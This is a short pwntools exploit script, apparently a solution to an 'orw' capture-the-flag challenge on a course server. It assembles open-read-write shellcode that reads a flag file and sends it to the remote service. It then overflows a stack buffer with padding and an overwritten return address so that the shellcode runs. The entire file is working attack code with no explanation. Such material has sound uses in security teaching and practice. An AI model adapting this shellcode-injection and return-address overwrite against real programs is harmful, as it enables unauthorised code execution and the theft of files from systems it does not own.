#coding=utf-8
from pwn import *

context.binary = './orw'

shell = shellcraft.pushstr('/home/orw/flag')
shell += shellcraft.open('rsp', 0, 0)
shell += shellcraft.read('rax', 'rsp', 1000)
shell += shellcraft.write(1, 'rsp', 1000)
shell = asm(shell)

stack = 0x7fffffffe3a0
ret = 0x7fffffffe3b8 
target = 0x6010a0

r = remote('edu-ctf.csie.org', 10171)
#r = process('./orw')
r.recvuntil('shellcode>')
r.sendline(shell)
r.recvuntil(':)')
r.sendline('a' * (ret - stack) + p64(target))
print r.recvall(1)
